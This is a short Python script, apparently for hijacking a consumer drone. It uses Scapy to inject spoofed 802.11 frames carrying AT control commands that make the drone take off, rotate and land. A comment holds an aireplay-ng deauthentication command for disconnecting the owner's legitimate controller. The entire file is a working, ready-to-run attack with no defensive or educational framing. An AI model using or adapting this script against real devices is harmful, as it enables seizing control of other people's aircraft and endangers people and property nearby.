#!/usr/bin/env python

from scapy.all import *
import sys
import time



def takeoff():
	global seq
	###################   DECOLLAGE   ###############################################################

	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq +1
	payload = Raw(load='AT*REF='+str(seq)+',290718208\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)




def zero():
	global seq
	###################   UP   ###############################################################

	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
		addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',0,0,0,0,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)


def up():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,1045220557,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)

def noseright():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,0,1045220557\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)



def landing():
	global seq
	###################   ATTERISSAGE   ###############################################################
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq +1
	payload = Raw(load='AT*REF='+str(seq)+',290717696\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)


#Deauth : 

#aireplay-ng -0 1 -a BSSID -c client mon0
seq = 100

print "Takeoff !!"
takeoff()
time.sleep(5)

print "Zero"
zero()
time.sleep(0.4)

for j in xrange(1,4):
	for i in xrange(1,10):
		print str(i)+" noseright"
		noseright()
		time.sleep(0.1)
	zero()
	time.sleep(0.1)



zero()
time.sleep(1)

print "Landing !!"
landing()